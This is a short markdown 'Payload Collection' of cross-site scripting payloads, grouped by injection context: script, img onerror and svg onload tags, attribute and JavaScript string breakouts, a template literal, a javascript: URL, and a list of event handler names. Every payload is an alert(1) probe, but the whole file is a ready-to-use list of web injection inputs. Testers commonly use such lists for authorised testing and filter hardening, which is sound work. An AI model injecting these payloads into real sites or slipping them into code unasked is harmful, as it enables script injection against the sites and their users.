# Payload Collection

## HTML

<script>alert(1)</script>

<img src=1 onerror=alert(1)>

<svg onload=alert(1)>

---

## Attribute

" autofocus onfocus=alert(1) x="

---

## JavaScript

';alert(1);//

'-alert(1)-'

---

## Template Literal

${alert(1)}

---

## URL

javascript:alert(1)

---

## Event Based

onfocus

onanimationstart

onload

onerror

ontoggle

onbeforeinput

ontransitionend

See XSS cheat sheet for browser-specific vectors.